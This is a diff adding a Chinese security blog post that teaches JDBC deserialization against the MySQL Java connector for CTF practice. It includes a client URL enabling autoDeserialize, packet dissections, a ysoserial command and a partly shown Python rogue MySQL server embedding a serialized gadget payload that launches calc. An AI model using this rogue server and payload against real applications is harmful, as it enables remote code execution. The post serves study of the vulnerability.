@@ -1,0 +1,457 @@
+<!DOCTYPE html>
+<html lang=ch>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+    <meta name="description" content="序学习java也有一段时间了，但是却不能写出java反序列化的题目。尤其是最近的一些比赛中，考点基本上是JDBC，可我还是一个折戟于cc链的小萌新啊 JDBCJDBC如雷贯耳，可这是一个什么玩意？  JDBC(Java Database Connectivity)是Java提供对数据库进行连接、操作的标准API。Java自身并不会去实现对数据库的连接、查询、更新等操作而是通过抽象出数据库操作的AP">
+<meta property="og:type" content="article">
+<meta property="og:title" content="JDBC反序列化">
+<meta property="og:url" content="https://q1ng-li.github.io/2026/04/11/blog35/index.html">
+<meta property="og:site_name" content="q1ng">
+<meta property="og:description" content="序学习java也有一段时间了，但是却不能写出java反序列化的题目。尤其是最近的一些比赛中，考点基本上是JDBC，可我还是一个折戟于cc链的小萌新啊 JDBCJDBC如雷贯耳，可这是一个什么玩意？  JDBC(Java Database Connectivity)是Java提供对数据库进行连接、操作的标准API。Java自身并不会去实现对数据库的连接、查询、更新等操作而是通过抽象出数据库操作的AP">
+<meta property="og:locale" content="ch_CN">
+<meta property="og:image" content="https://q1ng-li.github.io/images/image-20260411172420637.png">
+<meta property="og:image" content="https://q1ng-li.github.io/images/image-20260411174444802.png">
+<meta property="og:image" content="https://q1ng-li.github.io/images/image-20260411225649965.png">
+<meta property="og:image" content="https://q1ng-li.github.io/images/image-20260411231519005.png">
+<meta property="og:image" content="https://q1ng-li.github.io/images/image-20260412160933585.png">
+<meta property="og:image" content="https://q1ng-li.github.io/images/20200824105721-87c42a84-e5b5-1-1775973935317-3.png">
+<meta property="og:image" content="https://q1ng-li.github.io/images/image-20260412140851477.png">
+<meta property="og:image" content="https://q1ng-li.github.io/images/image-20260412170227204.png">
+<meta property="og:image" content="https://q1ng-li.github.io/images/image-20260412172228837.png">
+<meta property="og:image" content="https://q1ng-li.github.io/images/image-20260412175523713.png">
+<meta property="og:image" content="https://q1ng-li.github.io/images/image-20260412184456263.png">
+<meta property="og:image" content="https://q1ng-li.github.io/images/image-20260412192020232.png">
+<meta property="og:image" content="https://q1ng-li.github.io/images/image-20260413123432629.png">
+<meta property="og:image" content="https://q1ng-li.github.io/images/image-20260413193834395.png">
+<meta property="og:image" content="https://q1ng-li.github.io/images/image-20260413193920768.png">
+<meta property="article:published_time" content="2026-04-11T07:32:44.000Z">
+<meta property="article:modified_time" content="2026-04-13T11:48:34.623Z">
+<meta property="article:author" content="q1ng">
+<meta property="article:tag" content="java安全">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://q1ng-li.github.io/images/image-20260411172420637.png">
+    
+    
+        
+          
+              <link rel="shortcut icon" href="/images/1.jpg">
+          
+        
+        
+          
+            <link rel="icon" type="image/png" href="/images/1.jpg" sizes="192x192">
+          
+        
+        
+          
+            <link rel="apple-touch-icon" sizes="180x180" href="/images/1.jpg">
+          
+        
+    
+    <!-- title -->
+    <title>JDBC反序列化</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css">
+
+    
+<link rel="stylesheet" href="/lib/meslo-LG/styles.css">
+
+    
+<link rel="stylesheet" href="/lib/justified-gallery/justifiedGallery.min.css">
+
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- rss -->
+    
+    
+    <!-- jquery -->
+    
+<script src="/lib/jquery/jquery.min.js"></script>
+
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+<body>
+    <div class="banner">
+<div id="blogtitel" class="blogtitel">q1ng</div>
+<ul id="wrapper" class="wrapper">
+  <div class="sun">
+    <div class="star"></div>
+  </div>
+  <div class="mercury">
+    <div class="planet">
+      <div class="shadow"></div>
+    </div>
+  </div>
+  <div class="venus">
+    <div class="planet">
+      <div class="shadow"></div>
+    </div>
+  </div>
+  <div class="earth">
+    <div class="planet"><div class="shadow"></div></div>
+  </div>
+  <div class="mars">
+    <div class="planet"><div class="shadow"></div></div>
+  </div>
+  <div class="jupiter">
+    <div class="planet"><div class="shadow"></div></div>
+  </div>
+</ul>
+</div>
+
+    <div class="background">
+      
+        <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fa fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fa fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/home/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/tags">Tags</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a target="_blank" rel="noopener" href="http://github.com/tzvetkov75">Projects</a></li>
+        
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" href="/2026/04/13/blog36/"><i class="fa fa-chevron-left" aria-hidden="true" onmouseover='$("#i-prev").toggle();' onmouseout='$("#i-prev").toggle();'></i></a></li>
+        
+        
+        <li><a class="icon" href="/2026/04/04/blog34/"><i class="fa fa-chevron-right" aria-hidden="true" onmouseover='$("#i-next").toggle();' onmouseout='$("#i-next").toggle();'></i></a></li>
+        
+        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa fa-chevron-up" aria-hidden="true" onmouseover='$("#i-top").toggle();' onmouseout='$("#i-top").toggle();'></i></a></li>
+        <li><a class="icon" href="#"><i class="fa fa-share-alt" aria-hidden="true" onmouseover='$("#i-share").toggle();' onmouseout='$("#i-share").toggle();' onclick='$("#share").toggle();return false;'></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://q1ng-li.github.io/2026/04/11/blog35/"><i class="fa fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://q1ng-li.github.io/2026/04/11/blog35/&text=JDBC反序列化"><i class="fa fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://q1ng-li.github.io/2026/04/11/blog35/&title=JDBC反序列化"><i class="fa fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://q1ng-li.github.io/2026/04/11/blog35/&is_video=false&description=JDBC反序列化"><i class="fa fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=JDBC反序列化&body=Check out this article: https://q1ng-li.github.io/2026/04/11/blog35/"><i class="fa fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://q1ng-li.github.io/2026/04/11/blog35/&title=JDBC反序列化"><i class="fa fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://q1ng-li.github.io/2026/04/11/blog35/&title=JDBC反序列化"><i class="fa fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://q1ng-li.github.io/2026/04/11/blog35/&title=JDBC反序列化"><i class="fa fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://q1ng-li.github.io/2026/04/11/blog35/&title=JDBC反序列化"><i class="fa fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://q1ng-li.github.io/2026/04/11/blog35/&name=JDBC反序列化&description="><i class="fa fa-tumblr " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%BA%8F"><span class="toc-number">1.</span> <span class="toc-text">序</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#JDBC"><span class="toc-number">2.</span> <span class="toc-text">JDBC</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="toc-number">2.1.</span> <span class="toc-text">环境搭建</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#gadget%E9%93%BE"><span class="toc-number">2.2.</span> <span class="toc-text">gadget链</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9E%84%E9%80%A0%E6%81%B6%E6%84%8Fmysql%E6%9C%8D%E5%8A%A1%E5%99%A8"><span class="toc-number">2.2.1.</span> <span class="toc-text">构造恶意mysql服务器</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#poc"><span class="toc-number">2.3.</span> <span class="toc-text">poc</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">2.4.</span> <span class="toc-text">总结</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BE%8B%E9%A2%98-%E7%BE%8A%E5%9F%8E%E6%9D%AF-2020-A-Piece-Of-Java"><span class="toc-number">2.5.</span> <span class="toc-text">例题  [羊城杯 2020]A Piece Of Java</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%86%E6%9E%90%E4%BB%A3%E7%A0%81"><span class="toc-number">2.5.1.</span> <span class="toc-text">分析代码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9E%84%E9%80%A0gadget"><span class="toc-number">2.5.2.</span> <span class="toc-text">构造gadget</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86"><span class="toc-number">2.5.2.1.</span> <span class="toc-text">动态代理</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#exp"><span class="toc-number">2.5.3.</span> <span class="toc-text">exp</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E6%80%BB%E7%BB%93"><span class="toc-number">2.5.4.</span> <span class="toc-text">题目总结</span></a></li></ol></li></ol></li></ol>
+    </div>
+  </span>
+</div>
+
+      
+      <div class="content index width mx-auto px2 my4">
+          
+          <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        JDBC反序列化
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">q1ng</span>
+      </span>
+      
+    <div class="postdate">
+        <time datetime="2026-04-11T07:32:44.000Z" itemprop="datePublished">2026-04-11</time>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fa fa-tag"></i>
+        <a class="tag-link-link" href="/tags/java%E5%AE%89%E5%85%A8/" rel="tag">java安全</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <h1 id="序"><a href="#序" class="headerlink" title="序"></a>序</h1><p>学习java也有一段时间了，但是却不能写出java反序列化的题目。尤其是最近的一些比赛中，考点基本上是JDBC，可我还是一个折戟于cc链的小萌新啊</p>
+<h1 id="JDBC"><a href="#JDBC" class="headerlink" title="JDBC"></a>JDBC</h1><p>JDBC如雷贯耳，可这是一个什么玩意？</p>
+<blockquote>
+<p>JDBC(Java Database Connectivity)是Java提供对数据库进行连接、操作的标准API。Java自身并不会去实现对数据库的连接、查询、更新等操作而是通过抽象出数据库操作的API接口(JDBC)，不同的数据库提供商必须实现JDBC定义的接口从而也就实现了对数据库的一系列操作。</p>
+</blockquote>
+<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>新建一个maven项目(本人选择jdk8_u65)，pom.xml内容如下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">&lt;dependencies&gt;<br>    &lt;dependency&gt;<br>        &lt;groupId&gt;mysql&lt;/groupId&gt;<br>        &lt;artifactId&gt;mysql-connector-java&lt;/artifactId&gt;<br>        &lt;version&gt;8.0.19&lt;/version&gt;<br>    &lt;/dependency&gt;<br>    &lt;dependency&gt;<br>        &lt;groupId&gt;commons-collections&lt;/groupId&gt;<br>        &lt;artifactId&gt;commons-collections&lt;/artifactId&gt;<br>        &lt;version&gt;3.2.1&lt;/version&gt;<br>    &lt;/dependency&gt;<br>&lt;/dependencies&gt;<br></code></pre></td></tr></table></figure>
+
+<p>我们先构造一个jdbc客户端。了解jdbc运行机制</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">import java.sql.*;<br><br>public class Jdbc_client &#123;<br>    public static void main(String[] args) throws Exception &#123;         // 1. 加载驱动<br>        Class.forName(&quot;com.mysql.cj.jdbc.Driver&quot;);<br>        String jdbc_url = &quot;jdbc:mysql://127.0.0.1:3306/root?characterEncoding=UTF-8&amp;serverTimezone=Asia/Shanghai&quot; +<br>                &quot;&amp;autoDeserialize=true&quot; +<br>                &quot;&amp;queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&quot;;<br>        Connection con = DriverManager.getConnection(jdbc_url, &quot;root&quot;, &quot;root&quot;);<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure>
+
+<p>看到Class.forName，不自觉想到上次学习的类加载机制，这里需要加载com.mysql.jdbc.Driver，还记得之前的pom.xml,类加载过程中会向classpath中寻找，正是在mysql-connector-java-8.0.19.jar中，后续就是正常查询本地数据库的内容</p>
+<p>我用wireshake抓了这个Jdbc_client与本地mysql服务的数据包，简单分析一下（这里为什么要抓包，我们后续会说明）</p>
+<p><img src="/./images/image-20260411172420637.png" alt="image-20260411172420637"></p>
+<p>按照建立连接的时间，首先是Server Greeting包，这是 MySQL 握手阶段的第一步，当你的 Java 客户端连接到 3306 端口时，服务器都会发送这个包，用于告诉客户端自己的版本，以及自己生成的随机数和Authentication Plugin（身份验证插件）</p>
+<p><img src="/./images/image-20260411174444802.png" alt="image-20260411174444802"></p>
+<p>其次客户端递交账号密码；接着服务端返回Response OK	对应的包<code>0700000200000002000000</code>；然后就是客户端 Request Query; 再接着就是mysql服务端的Response TABULAR Response，<code>SHOW SESSION STATUS</code> 响应包</p>
+<p><img src="/./images/image-20260411225649965.png" alt="image-20260411225649965"></p>
+<h2 id="gadget链"><a href="#gadget链" class="headerlink" title="gadget链"></a>gadget链</h2><p><code>com.mysql.cj.jdbc.result.ResultSetImpl#getOBject()</code>调用了readObject()方法</p>
+<p><img src="/./images/image-20260411231519005.png" alt="image-20260411231519005"></p>
+<p>我们简单看看这个getObject(),想要触发<code>obj = objIn.readObject();</code>要满足一些条件，首先要满足type属于二进制或者是Blob,其次autoDeserialize要为true</p>
+<p>JDBC 通过 MySQL 数据库查询数据会返回一个结果集，将查询到的结果返回给程序，并将结果封装在 <code>ResultSetImpl</code> 这个类中,所以这个类不满足<strong>用户可控输入</strong>这一点</p>
+<p>接下来是<code>com.mysql.cj.jdbc.util.ResultSetUtil#resultSetToMap()</code>调用了ResultSetImpl#getObject(),<code>ResultSetUtil</code> 这个类是用来处理一些测试实例的结果</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">public static void resultSetToMap(Map mappedValues, ResultSet rs) throws SQLException &#123;<br>    while(rs.next()) &#123;<br>        mappedValues.put(rs.getObject(1), rs.getObject(2));<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>继续往上看看，<code>com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor#populateMapWithSessionStatusValues()</code>调用了ResultSetUtil#resultSetToMap()</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">private void populateMapWithSessionStatusValues(Map&lt;String, String&gt; toPopulate) &#123;<br>    Statement stmt = null;<br>    ResultSet rs = null;<br><br>    try &#123;<br>        try &#123;<br>            toPopulate.clear();<br>            stmt = this.connection.createStatement();<br>            rs = stmt.executeQuery(&quot;SHOW SESSION STATUS&quot;);<br>            ResultSetUtil.resultSetToMap(toPopulate, rs);<br>        &#125; finally &#123;<br>            if (rs != null) &#123;<br>                rs.close();<br>            &#125;<br><br>            if (stmt != null) &#123;<br>                stmt.close();<br>            &#125;<br><br>        &#125;<br><br>    &#125; catch (SQLException var8) &#123;<br>        throw ExceptionFactory.createException(var8.getMessage(), var8);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>最后再往上，ServerStatusDiffInterceptor#preProcess()和ServerStatusDiffInterceptor#postProcess()都调用了ServerStatusDiffInterceptor#populateMapWithSessionStatusValues().而preProcess 和 postProcess ，是执行查询语句自动执行的方法</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">public &lt;T extends Resultset&gt; T preProcess(Supplier&lt;String&gt; sql, Query interceptedQuery) &#123;<br>    this.populateMapWithSessionStatusValues(this.preExecuteValues);<br>    return null;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+
+
+<p>可是ServerStatusDiffInterceptor是一个什么类？</p>
+<blockquote>
+<p>是一个拦截器类，拦截器允许你在 SQL 查询执行、事务处理、连接管理等操作时执行额外的操作。在 JDBC URL 中设定属性 <code>queryInterceptors</code> 为 <code>ServerStatusDiffInterceptor</code> 时，执行查询语句会调用拦截器的 preProcess 和 postProcess 方法</p>
+</blockquote>
+<p>那么现在就清晰了，在mysql查询过程中去触发我们自定义的拦截器，然后调用preProcess()方法，进而调用populateMapWithSessionStatusValues()方法；在populateMapWithSessionStatusValues()方法内部执行了<code>SHOW SESSION STATUS</code>,然后调用了<code>resultSetToMap()</code>方法，返回结果；该方法调用了触发反序列化漏洞的getObject()函数</p>
+<h3 id="构造恶意mysql服务器"><a href="#构造恶意mysql服务器" class="headerlink" title="构造恶意mysql服务器"></a>构造恶意mysql服务器</h3><p>想要触发JDBC反序列化，必须要求JDBC客户端与mysql服务端的交互，并且执行了<code>SHOW SESSION STATUS</code>语句，所以我们需要构造一个mysql服务，模拟交互过程，返回一个恶意数据。正如之前要解释我为什么要分析mysql数据包</p>
+<p>[1]Server Greeting包，我们只需要将MySQL Protocol复制粘贴，即<code>4a 00 00 00  0a 35 2e 35 2e 35 33 00 0a 00 00 00 4c 45 54 59 40 74 4a 51 00 ff f7 21 02 00 0f 80 15 00 00 00 00 00 00 00 00 00 00 39 69 26 7c 61 50 4f 7b 40  6a 77 36 00 6d 79 73 71 6c 5f 6e 61 74 69 76 65  5f 70 61 73 73 77 6f 72 64 00</code></p>
+<p>[2]Response OK包，同样的将MySQL Protocol复制粘贴，即<code>0700000200000002000000</code></p>
+<p>[3]配置信息响应包，复制粘贴即可</p>
+<p><img src="/./images/image-20260412160933585.png" alt="image-20260412160933585"></p>
+<p>[4]SHOW SESSION STATUS响应包，图中编号是635，需要自行编写，需要对mysql的协议有所了解。</p>
+<p>从流量中可以看出show session status属于 Request Query，对于一个查询数据包的响应有四种：错误包（ERR Packet）、正确包（OK Packet）、 Protocol::LOCAL_INFILE_Request、结果集（ProtocolText::Resultset），Response OK就属于正确包；结果集响应包的结构如图：</p>
+<p><img src="/./images/20200824105721-87c42a84-e5b5-1-1775973935317-3.png" alt="20200824105721-87c42a84-e5b5-1"></p>
+<ul>
+<li>数据段1：说明下面的结果集有多少列  column count(<strong>注意大小端序</strong>)</li>
+</ul>
+<p><code>0100000102</code>Packet Length :  00 00 01</p>
+<p>​                      Packet Number: 01</p>
+<p>​                      Number of fields:02 </p>
+<ul>
+<li>数据段2：列的定义</li>
+</ul>
+<p><code>1a000002036465660001630163016301630c3f00ffff0000fcffff000000</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">1a 00 00  //3字节表示长度（这个长度说的是协议的内容长度，不包括序号那一字节）<br>02        //序号 因为是第二个数据字段<br>03646566  //这个就是def的意思。<br>00        //schema 协议 因为不使用就用00<br>01 63     //table 因为我们使用列数据，就不需要名字了，下面几个都是任意字符。字符串第一字节是用来说明长度的。<br>01 63  	  //org_table  01表示1字节，63是数据<br>0163      //name  <br>0163      //org_name<br>0c      filler  // length of the following fields 总是0x0c<br>3f00   //characterset  字符编码 003f是binary <br>ffff0000  column_length //允许数据最大长度，就是我们行数据的最大长度。ffff<br>fc    //column_type 这一列数据类型  fc表示blob  <br>9000    //flags  9000用的官方的 poc可以运行。  看fnmsd的要大于128好像。<br>00          //decimals<br>0000        //filler_2<br></code></pre></td></tr></table></figure>
+
+<ul>
+<li>数据段3： EOF 包</li>
+</ul>
+<p><code>05000004fe00002200</code>  Packet Length 00 00 05 </p>
+<p>​                                         Packer Number 04</p>
+<p>​                                         Response Code: fe</p>
+<p>​                                         Warnings 0</p>
+<p>​                                         Server Status  0022</p>
+<ul>
+<li>数据段4：行数据 row packet</li>
+</ul>
+<p>这段数据就是执行的poc,注意Packet Length ,Packet Number这两个字段</p>
+<p><img src="/./images/image-20260412140851477.png" alt="image-20260412140851477"></p>
+<h2 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">java -jar ysoserial [Gadget] [command] &gt; payload<br></code></pre></td></tr></table></figure>
+
+<p>Serve</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br></pre></td><td class="code"><pre><code class="hljs plaintext"># -*- coding:utf-8 -*-<br>#@Time : 2020/7/27 2:10<br>#@Author: Tri0mphe7<br>#@File : server.py<br>import socket<br>import binascii<br>import os<br><br>greeting_data=&quot;4a0000000a352e372e31390008000000463b452623342c2d00fff7080200ff811500000000000000000000032851553e5c23502c51366a006d7973716c5f6e61746976655f70617373776f726400&quot;<br>response_ok_data=&quot;0700000200000002000000&quot;<br><br>def receive_data(conn):<br>    data = conn.recv(1024)<br>    print(&quot;[*] Receiveing the package : &#123;&#125;&quot;.format(data))<br>    return str(data).lower()<br><br>def send_data(conn,data):<br>    print(&quot;[*] Sending the package : &#123;&#125;&quot;.format(data))<br>    conn.send(binascii.a2b_hex(data))<br><br>def get_payload_content(): <br>    file= r&#x27;a&#x27;<br>    if os.path.isfile(file):<br>        with open(file, &#x27;rb&#x27;) as f:<br>            payload_content = str(binascii.b2a_hex(f.read()),encoding=&#x27;utf-8&#x27;)<br>        print(&quot;open successs&quot;)<br><br>    else:<br>        print(&quot;open false&quot;)<br>        #calc<br>        payload_content=&#x27;aced0005737200116a6176612e7574696c2e48617368536574ba44859596b8b7340300007870770c000000023f40000000000001737200346f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e6b657976616c75652e546965644d6170456e7472798aadd29b39c11fdb0200024c00036b65797400124c6a6176612f6c616e672f4f626a6563743b4c00036d617074000f4c6a6176612f7574696c2f4d61703b7870740003666f6f7372002a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e6d61702e4c617a794d61706ee594829e7910940300014c0007666163746f727974002c4c6f72672f6170616368652f636f6d6d6f6e732f636f6c6c656374696f6e732f5472616e73666f726d65723b78707372003a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e436861696e65645472616e73666f726d657230c797ec287a97040200015b000d695472616e73666f726d65727374002d5b4c6f72672f6170616368652f636f6d6d6f6e732f636f6c6c656374696f6e732f5472616e73666f726d65723b78707572002d5b4c6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e5472616e73666f726d65723bbd562af1d83418990200007870000000057372003b6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e436f6e7374616e745472616e73666f726d6572587690114102b1940200014c000969436f6e7374616e7471007e00037870767200116a6176612e6c616e672e52756e74696d65000000000000000000000078707372003a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e496e766f6b65725472616e73666f726d657287e8ff6b7b7cce380200035b000569417267737400135b4c6a6176612f6c616e672f4f626a6563743b4c000b694d6574686f644e616d657400124c6a6176612f6c616e672f537472696e673b5b000b69506172616d54797065737400125b4c6a6176612f6c616e672f436c6173733b7870757200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c02000078700000000274000a67657452756e74696d65757200125b4c6a6176612e6c616e672e436c6173733bab16d7aecbcd5a990200007870000000007400096765744d6574686f647571007e001b00000002767200106a6176612e6c616e672e537472696e67a0f0a4387a3bb34202000078707671007e001b7371007e00137571007e001800000002707571007e001800000000740006696e766f6b657571007e001b00000002767200106a6176612e6c616e672e4f626a656374000000000000000000000078707671007e00187371007e0013757200135b4c6a6176612e6c616e672e537472696e673badd256e7e91d7b4702000078700000000174000463616c63740004657865637571007e001b0000000171007e00207371007e000f737200116a6176612e6c616e672e496e746567657212e2a0a4f781873802000149000576616c7565787200106a6176612e6c616e672e4e756d62657286ac951d0b94e08b020000787000000001737200116a6176612e7574696c2e486173684d61700507dac1c31660d103000246000a6c6f6164466163746f724900097468726573686f6c6478703f4000000000000077080000001000000000787878&#x27;<br>    return payload_content<br><br># 主要逻辑<br>def 